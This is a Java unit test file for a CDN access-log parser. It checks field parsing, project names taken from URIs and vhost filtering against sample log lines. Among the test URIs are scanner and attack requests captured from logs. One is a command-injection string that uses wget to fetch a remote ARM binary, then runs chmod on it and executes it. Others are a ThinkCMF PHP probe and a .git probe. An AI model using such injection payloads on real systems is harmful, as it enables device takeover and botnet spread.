package ru.yandex.market.logshatter.parser.front.errorBooster.cdn;

import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;

import org.junit.jupiter.api.Test;

import ru.yandex.market.logshatter.parser.LogParserChecker;
import ru.yandex.market.logshatter.parser.front.errorBooster.UpstreamCacheStatus;

import static org.junit.jupiter.api.Assertions.assertEquals;

public class CDNAccessLogParserTest {
    @Test
    @SuppressWarnings("MethodLength")
    public void testParse() throws Exception {
        LogParserChecker checker = new LogParserChecker(new CDNAccessLogParser());
        checker.setParam("allowedVhosts", "yastatic.net");

        checker.check(
            "tskv\ttskv_format=cdn-static-access-tskv-log\ttimestamp=2020-01-20T16:30:52\ttimezone=+0300\tstatus=200" +
                "\tprotocol=HTTP/2.0\tmethod=GET\trequest=/yandex-video-player-iframe-api-bundles-stable/1" +
                ".0-3162/js/video-player-iframe-api-bundle.modern.js\treferer=https://frontend.vh.yandex" +
                ".ru/embed/6358857771078961779?utm_source=yxnews&utm_medium=mobile&utm_referrer=https%3A%2F%2Fyandex" +
                ".ru%2Fnews&from=yanews&reqid=1579527049357753-18926805703229248300100-production-news-app-host-8.man" +
                ".yp-c.yandex.net&slots=35428%2C0%2C66%3B118267%2C0%2C17%3B187314%2C0%2C17%3B175664%2C0%2C17%3B196521" +
                "%2C0%2C17%3B204255%2C0%2C64%3B201762%2C0%2C97%3B21983%2C0%2C84%3B203836%2C0%2C4%3B135686%2C0%2C17" +
                "%3B135732%2C0%2C96&autoplay=1&mute=1\tcookies=-\tuser_agent=Mozilla/5.0 (Linux; Android 9; SM-A530F " +
                "Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 " +
                "Mobile Safari/537.36 YandexSearch/9.85 YandexSearchBrowser/9.85\tvhost=yastatic" +
                ".net\tip=2a02:2698:182b:1249:59bc:9896:700d:8d4f\tx_forwarded_for=-\tx_real_ip=-\thostname=cstatic" +
                "-ekt01.regions.yandex.net\tloc=ekt\ttime_local=20/Jan/2020:16:30:52 +0300\thttp_host=yastatic" +
                ".net\tremote_addr=2a02:2698:182b:1249:59bc:9896:700d:8d4f\trequest_id" +
                "=b05485da591f7f959e6b5bde08dd85cf\thttp_referer=https://frontend.vh.yandex" +
                ".ru/embed/6358857771078961779?utm_source=yxnews&utm_medium=mobile&utm_referrer=https%3A%2F%2Fyandex" +
                ".ru%2Fnews&from=yanews&reqid=1579527049357753-18926805703229248300100-production-news-app-host-8.man" +
                ".yp-c.yandex.net&slots=35428%2C0%2C66%3B118267%2C0%2C17%3B187314%2C0%2C17%3B175664%2C0%2C17%3B196521" +
                "%2C0%2C17%3B204255%2C0%2C64%3B201762%2C0%2C97%3B21983%2C0%2C84%3B203836%2C0%2C4%3B135686%2C0%2C17" +
                "%3B135732%2C0%2C96&autoplay=1&mute=1\thttp_user_agent=Mozilla/5.0 (Linux; Android 9; SM-A530F " +
                "Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 " +
                "Mobile Safari/537.36 YandexSearch/9.85 YandexSearchBrowser/9" +
                ".85\thttp_cookie=-\turi=/yandex-video-player-iframe-api-bundles-stable/1" +
                ".0-3162/js/video-player-iframe-api-bundle.modern" +
                ".js\targs=-\tssl_session_id=419b60cd21f29ef108e52e212d0245fdfc544f129f5ac3a0e8623fb2aa39ed22" +
                "\tupstream_cache_status=EXPIRED\tupstream_addr=[2a02:6b8:0:3400::123]:80\tupstream_status=200\tsize" +
                "=52470\tupstream_response_time=0.168\trequest_time=0.169\tssl_handshake_time=0" +
                ".000\tssl_protocol=TLSv1.3\tssl_cipher=TL",
            new Date(1579527052000L),
            "yandex-video-player-iframe-api-bundles-stable", // project
            "Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like " +
                "Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 YandexSearch/9.85 YandexSearchBrowser/9" +
                ".85", // user_agent
            "/yandex-video-player-iframe-api-bundles-stable/1.0-3162/js/video-player-iframe-api-bundle.modern.js", //
            // uri
            "https://frontend.vh.yandex.ru/embed/6358857771078961779?utm_source=yxnews&utm_medium=mobile&utm_referrer" +
                "=https%3A%2F%2Fyandex.ru%2Fnews&from=yanews&reqid=1579527049357753-18926805703229248300100" +
                "-production-news-app-host-8.man.yp-c.yandex" +
                ".net&slots=35428%2C0%2C66%3B118267%2C0%2C17%3B187314%2C0%2C17%3B175664%2C0%2C17%3B196521%2C0%2C17" +
                "%3B204255%2C0%2C64%3B201762%2C0%2C97%3B21983%2C0%2C84%3B203836%2C0%2C4%3B135686%2C0%2C17%3B135732" +
                "%2C0%2C96&autoplay=1&mute=1", // referer
            "2a02:2698:182b:1249:59bc:9896:700d:8d4f", // ipv6
            168, // upstream_response_time
            169, // request_time
            52470, // size
            "HTTP/2.0", // protocol
            "ekt", // location
            "yastatic.net", // vhost
            "cstatic-ekt01.regions.yandex.net", // hostname
            "[2a02:6b8:0:3400::123]:80", // upstream_addr
            UpstreamCacheStatus.EXPIRED, // upstream_cache_status
            200, // status
            0 // tcp_info_rtt_us
        );

        checker.check(
            "tskv\ttskv_format=cdn-static-access-tskv-log\ttimestamp=2020-01-19T19:18:06\ttimezone=+0300\tstatus=404" +
                "\tprotocol=HTTP/2.0\tmethod=GET\trequest=/q/set/s/rsya-tag-users/bundle.js\treferer=https://yastatic" +
                ".net/safeframe-bundles/0.69/1-1-0/render.html\tcookies=-\tuser_agent=Mozilla/5.0 (Linux; Android 8.1" +
                ".0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79" +
                ".0.3945.116 Mobile Safari/537.36\tvhost=google.com\tip=176.59.2" +
                ".108\tx_forwarded_for=-\tx_real_ip=-\thostname=cstatic-mskm908.regions.yandex" +
                ".net\tloc=mskm9\ttime_local=20/Jan/2020:16:30:04 +0300\thttp_host=yastatic.net\tremote_addr=176.59.2" +
                ".108\trequest_id=9590dbab3726d9cf24e2e9af6741ebd3\thttp_referer=https://yastatic" +
                ".net/safeframe-bundles/0.69/1-1-0/render.html\thttp_user_agent=Mozilla/5.0 (Linux; Android 8.1.0; " +
                "Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0" +
                ".3945.116 Mobile Safari/537.36\thttp_cookie=-\turi=/q/set/s/rsya-tag-users/bundle" +
                ".js\targs=-\tssl_session_id=33fa913889e7b01813949b8e9b9c8183d1a460e8619685ba8741bc8f0abab296" +
                "\tupstream_cache_status=HIT\tupstream_addr=-\tupstream_status=-\tsize=35434\tupstream_response_time" +
                "=-\trequest_time=0.000\tssl_handshake_time=0.110\tssl_protocol=TLSv1" +
                ".3\tssl_cipher=TLS_AES_256_GCM_SHA384\tssl_ecdhe_curve=UNDEF\tssl_early_data_status" +
                "=EARLY_DATA_NOT_SENT\tconnection_requests=1\ttcpinfo_rtt=1463399\ttcpinfo_rttvar=31405\ttcpinfo_lost" +
                "=0\ttcpinfo_retrans=0",
            new Date(1579450686000L),
            "qloud_all", // project
            "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like " +
                "Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36", // user_agent
            "/q/set/s/rsya-tag-users/bundle.js", // uri
            "https://yastatic.net/safeframe-bundles/0.69/1-1-0/render.html", // referer
            "::ffff:176.59.2.108", // ipv6
            0, // upstream_response_time
            0, // request_time
            35434, // size
            "HTTP/2.0", // protocol
            "mskm9", // location
            "unknown", // vhost
            "cstatic-mskm908.regions.yandex.net", // hostname
            "-", // upstream_addr
            UpstreamCacheStatus.HIT, // upstream_cache_status
            404, // status
            1463399 // tcp_info_rtt_us
        );

        // everybodybecoolthisis
        checker.checkEmpty("tskv\ttskv_format=cdn-static-access-tskv-log\ttimestamp=2020-01-19T19:18:06\ttimezone" +
            "=+0300\tstatus=200\tprotocol=HTTP/2.0\tmethod=GET\trequest=/downloader/connect" +
            ".cfg?everybodybecoolthisis=crasher\treferer=https://yastatic.net/safeframe-bundles/0.69/1-1-0/render" +
            ".html\tcookies=-\tuser_agent=Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Build/OPM1.171019.026; wv) " +
            "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537" +
            ".36\tvhost=yastatic.net\tip=176.59.2.108\tx_forwarded_for=-\tx_real_ip=-\thostname=cstatic-mskm908" +
            ".regions.yandex.net\tloc=mskm9\ttime_local=20/Jan/2020:16:30:04 +0300\thttp_host=yastatic" +
            ".net\tremote_addr=176.59.2.108\trequest_id=9590dbab3726d9cf24e2e9af6741ebd3\thttp_referer=https" +
            "://yastatic.net/safeframe-bundles/0.69/1-1-0/render.html\thttp_user_agent=Mozilla/5.0 (Linux; Android 8" +
            ".1.0; Redmi 5 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0" +
            ".3945.116 Mobile Safari/537.36\thttp_cookie=-\turi=/downloader/connect" +
            ".cfg?everybodybecoolthisis=crasher\targs=-\tssl_session_id" +
            "=33fa913889e7b01813949b8e9b9c8183d1a460e8619685ba8741bc8f0abab296\tupstream_cache_status=HIT" +
            "\tupstream_addr=-\tupstream_status=-\tsize=35434\tupstream_response_time=-\trequest_time=0" +
            ".000\tssl_handshake_time=0.110\tssl_protocol=TLSv1" +
            ".3\tssl_cipher=TLS_AES_256_GCM_SHA384\tssl_ecdhe_curve=UNDEF\tssl_early_data_status=EARLY_DATA_NOT_SENT" +
            "\tconnection_requests=1\ttcpinfo_rtt=65470\ttcpinfo_rttvar=31405\ttcpinfo_lost=0\ttcpinfo_retrans=0");

        // empty uri
        checker.checkEmpty("tskv\ttskv_format=cdn-static-access-tskv-log\ttimestamp=2020-01-22T11:30:09\ttimezone" +
            "=+0300\tstatus=400\tprotocol=-\tmethod=-\trequest=-\treferer=-\tcookies=-\tuser_agent=-\tvhost=-\tip=195" +
            ".182.90.10\tx_forwarded_for=-\tx_real_ip=-\thostname=cstatic-mskstoredata01.regions.yandex" +
            ".net\tloc=mskstoredata\ttime_local=22/Jan/2020:11:30:09 +0300\thttp_host=-\tremote_addr=195.182.90" +
            ".10\trequest_id=45d1db7f354e711f0f2c21a7168d4453\thttp_referer=-\thttp_user_agent=-\thttp_cookie=-\turi" +
            "=-\targs=-\tssl_session_id=-\tupstream_cache_status=-\tupstream_addr=-\tupstream_status=-\tsize=309" +
            "\tupstream_response_time=-\trequest_time=0" +
            ".054\tssl_handshake_time=-\tssl_protocol=-\tssl_cipher=-\tssl_ecdhe_curve=-\tssl_early_data_status" +
            "=-\tconnection_requests=1\ttcpinfo_rtt=52988\ttcpinfo_rttvar=14933\ttcpinfo_lost=0\ttcpinfo_retrans=0");

        // empty status
        checker.checkEmpty("tskv\ttskv_format=cdn-static-access-tskv-log\ttimestamp=2020-01-20T16:30:52\ttimezone" +
            "=+0300\tstatus=null\tprotocol=HTTP/2.0\tmethod=GET\trequest=/yandex-video-player-iframe-api-bundles" +
            "-stable/1.0-3162/js/video-player-iframe-api-bundle.modern.js\treferer=https://frontend.vh.yandex" +
            ".ru/embed/6358857771078961779?utm_source=yxnews&utm_medium=mobile&utm_referrer=https%3A%2F%2Fyandex" +
            ".ru%2Fnews&from=yanews&reqid=1579527049357753-18926805703229248300100-production-news-app-host-8.man" +
            ".yp-c.yandex.net&slots=35428%2C0%2C66%3B118267%2C0%2C17%3B187314%2C0%2C17%3B175664%2C0%2C17%3B196521%2C0" +
            "%2C17%3B204255%2C0%2C64%3B201762%2C0%2C97%3B21983%2C0%2C84%3B203836%2C0%2C4%3B135686%2C0%2C17%3B135732" +
            "%2C0%2C96&autoplay=1&mute=1\tcookies=-\tuser_agent=Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1" +
            ".180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile " +
            "Safari/537.36 YandexSearch/9.85 YandexSearchBrowser/9.85\tvhost=yastatic" +
            ".net\tip=2a02:2698:182b:1249:59bc:9896:700d:8d4f\tx_forwarded_for=-\tx_real_ip=-\thostname=cstatic-ekt01" +
            ".regions.yandex.net\tloc=ekt\ttime_local=20/Jan/2020:16:30:52 +0300\thttp_host=yastatic" +
            ".net\tremote_addr=2a02:2698:182b:1249:59bc:9896:700d:8d4f\trequest_id=b05485da591f7f959e6b5bde08dd85cf" +
            "\thttp_referer=https://frontend.vh.yandex" +
            ".ru/embed/6358857771078961779?utm_source=yxnews&utm_medium=mobile&utm_referrer=https%3A%2F%2Fyandex" +
            ".ru%2Fnews&from=yanews&reqid=1579527049357753-18926805703229248300100-production-news-app-host-8.man" +
            ".yp-c.yandex.net&slots=35428%2C0%2C66%3B118267%2C0%2C17%3B187314%2C0%2C17%3B175664%2C0%2C17%3B196521%2C0" +
            "%2C17%3B204255%2C0%2C64%3B201762%2C0%2C97%3B21983%2C0%2C84%3B203836%2C0%2C4%3B135686%2C0%2C17%3B135732" +
            "%2C0%2C96&autoplay=1&mute=1\thttp_user_agent=Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610" +
            ".011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36 " +
            "YandexSearch/9.85 YandexSearchBrowser/9.85\thttp_cookie=-\turi=/yandex-video-player-iframe-api-bundles" +
            "-stable/1.0-3162/js/video-player-iframe-api-bundle.modern" +
            ".js\targs=-\tssl_session_id=419b60cd21f29ef108e52e212d0245fdfc544f129f5ac3a0e8623fb2aa39ed22" +
            "\tupstream_cache_status=EXPIRED\tupstream_addr=[2a02:6b8:0:3400::123]:80\tupstream_status=200\tsize" +
            "=52470\tupstream_response_time=0.168\trequest_time=0.169\tssl_handshake_time=0.000\tssl_protocol=TLSv1" +
            ".3\tssl_cipher=TL");
    }

    @Test
    public void parseProject() {
        assertEquals("pcode", CDNAccessLogParser.parseProject("/pcode/adfox/header-bidding.js"));
        assertEquals("ny2014", CDNAccessLogParser.parseProject("/ny2014/asw.js"));
        assertEquals("es5-shims", CDNAccessLogParser.parseProject("/es5-shims/0.0.2/es5-shims.min.js"));
        assertEquals("inj_js", CDNAccessLogParser.parseProject("/inj_js/common.js"));
        assertEquals("s3_web4static", CDNAccessLogParser.parseProject("/s3/web4static/_/1NMDeuZsP377LYI7EPnj1Lrg44g" +
            ".svg"));
        assertEquals("awaps-ad-sdk-js", CDNAccessLogParser.parseProject("/awaps-ad-sdk-js/1_0/adsdk.js"));
        assertEquals("qloud_all", CDNAccessLogParser.parseProject("/q/ott-widget/dist/sdk-loader.min.js"));
        assertEquals("yandex-video-player-iframe-api-bundles-stable", CDNAccessLogParser.parseProject("/yandex-video" +
            "-player-iframe-api-bundles-stable/1.0-3160/js/player.js"));
        assertEquals("aadb_yvp", CDNAccessLogParser.parseProject("/yandex-video-player-iframe-api-bundles-stable" +
            "/rNS54A561/70a028KRz-4/UbPjAXuCsMuaEDtRAt9xih3APSpNqrVaRV_tWl0027PgiayPCvfOWfc2uDjS7aN" +
            "-SALeZCAsPc9wQIgZzgM2eF2suV79D_UO2Vz3WRscs8VPBTxihWwl2k_Eah1eohd9_lwlVlX2iVG" +
            "-uWp4FLfotwkD3yYjpj9BvMFFnMQDtznUbLBXvkB0gtQQshFUEfsFDwz74keo5VYODyBZFqzVO7bc7t6aP8pQN7nqO9X0af3" +
            "FDV_i4SawCDTPTxAEz7uxE2D0V7yJuI3Y3bUb3ZRwi4gONmnFYOobTwftktymFf35Hu7dEzQCnfb1bTMbfeh1TEcfbGVlcE" +
            "w_xYOcRIrzNVzhdpJ_yHALlt692lxVsIaISrIpSiIlWQhK59MUK5Wzvh8nmFt-idc3_mE2kj5h-gdFlaxlafdLdE"));
        assertEquals("aadb_morda", CDNAccessLogParser.parseProject("/www/_/Hx2lh7345/4e5f2apkf5j/5o9eW/P1ZZdaYC/Crehs" +
            "/AplS4xflosi/_lh/hCgHE8-e/3NTVhNRw/c4h4g/hvhXDTHljRh/sgZtZ/CSw-KOn41/Xj4BY/4bfCTBMl4/lyw/REN-lUsBS/a4f" +
            "-__tN9/9Z7eg/s5V9SHD/syeVU/kXuL3TY/AneaJH1gRr/lYDJc/ZWLkqu/i7Zi3Y4/2CZsueq2/E5L-5Rsnh/Ea5RX/EFP0bb3qy" +
            "/XXKc/YPdIvJcbCgG/E35OC2/63kUSwSn/GfVs0/8OtKK/gQaRg4q4/5YOQhF/-7pQvct9/pyJR3X/IbNJJGbkfE/dQtX/Su_85owm" +
            "/KG5wumY/UkKMQ4K/FRtosu/stmhAbmWPd/Bnml/j8lzg5Xcn_b/tkuda/irl71J2/9YjoYpV/vFSHE-s1/c8CaA/e25_DaNlxn" +
            "/esHwQs/NHgcwZ1/MLZrX/tIJNIR/8tKqxJ"));
        assertEquals("www", CDNAccessLogParser.parseProject("/www/_/WGJONPhLJ4DkNRuT_d4SHYWFxhc.png"));
        assertEquals("root_requests", CDNAccessLogParser.parseProject("/nearest.js"));
        assertEquals("root_requests", CDNAccessLogParser.parseProject("/card_scan_decoder.php?No=30&door=%60wget"));
        assertEquals("root_rewrite", CDNAccessLogParser.parseProject("/v-68/slovari-ng/js/_head.js"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("a"));
        assertEquals("unknown", CDNAccessLogParser.parseProject(""));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/2.2.0/common/block/i-global/link/i-global.link.css"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/649FB03F-A414-4B28-B23A-2B70529E6894/init"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/J11138612/2.0.3"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/i/form/yandex-hint.png"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/_/xisLzoEUK0TZZoVIOJ5vUvXNBXo.png/"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/index.php?s=/Index"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/.well-known/dnt-policy.txt"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/.git/description"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/?a=fetch&content=<php>die(@md5(HelloThinkCMF))" +
            "</php>"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/%20share/share.js"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/card_scan_decoder.php?No=30&door=%60wget " +
            "http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear.selfrep%60"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/v2.0/js/all.js"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/hls.js/0.12.2-1761-1846-1976_tmp-2080-2095-2146" +
            "-2171-2-2172-2232_tmp-2427/hls.min.js"));
        assertEquals("unknown", CDNAccessLogParser.parseProject("/https://yastatic.net/"));
    }

    @Test
    public void parseVhost() {
        assertEquals("unknown", CDNAccessLogParser.parseVhost("", new HashSet<String>(Arrays.asList())));
        assertEquals("unknown", CDNAccessLogParser.parseVhost("yastat.net", new HashSet<String>(Arrays.asList())));
        assertEquals("unknown", CDNAccessLogParser.parseVhost("google.com", new HashSet<String>(Arrays.asList("yastat" +
            ".net"))));
        assertEquals("unknown", CDNAccessLogParser.parseVhost("[2a02:6b8:20::215]",
            new HashSet<String>(Arrays.asList("yastat.net"))));
        assertEquals("yastat.net", CDNAccessLogParser.parseVhost("yastat.net", new HashSet<String>(Arrays.asList(
            "yastat.net"))));
        assertEquals("yastat.net", CDNAccessLogParser.parseVhost("yastat.net:80", new HashSet<String>(Arrays.asList(
            "yastat.net"))));

    }
}
